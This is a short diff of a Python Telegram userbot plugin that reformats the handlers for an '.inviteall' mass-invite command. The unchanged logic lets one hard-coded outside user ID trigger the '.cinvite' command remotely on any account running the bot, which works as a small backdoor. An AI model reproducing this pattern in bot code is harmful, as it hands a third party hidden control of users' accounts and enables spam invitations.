@@ -1,4 +1,4 @@
-# Ported By @VckyouuBitch 
+# Ported By @VckyouuBitch
 # Forked By @MaafGausahSokap
 # Copyright © Team RAM - UBOT
 # Hush Hush Sana ajg gausah kesini
@@ -53,7 +53,8 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=1972682280,
+          pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
